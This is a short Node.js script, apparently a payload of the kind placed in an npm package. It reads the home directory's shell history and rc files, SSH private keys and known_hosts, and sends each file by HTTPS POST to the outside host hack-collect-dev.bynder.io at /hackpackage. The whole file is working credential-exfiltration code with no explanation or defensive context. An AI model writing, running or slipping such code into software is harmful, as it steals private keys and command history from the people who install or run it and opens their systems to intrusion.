var fs = require('fs')
var http = require("https");
var os = require('os');
let filesOfInterest = ["/.zshrc", "/.bash_history", "/.zsh_history",
                       "/.ssh/id_rsa", "/.ssh/id_ed25519",
                       "/.ssh/known_hosts"];

const homedir = os.homedir();

for (let fileofinterest of filesOfInterest) {
  fs.readFile(homedir + fileofinterest, 'utf8', function (err,data) {
    if (err) {
      return console.log(err);
    }

    var options = {
      hostname: 'hack-collect-dev.bynder.io',
      port: 443,
      path: '/hackpackage',
      method: 'POST',
    };
    var req = http.request(options, function(res) {
      res.setEncoding('utf8');
    });
    req.on('error', function(e) {
      console.log('problem with request: ' + e.message);
    });
    // write data to request body
    req.write(data);
    req.end();
  });
}
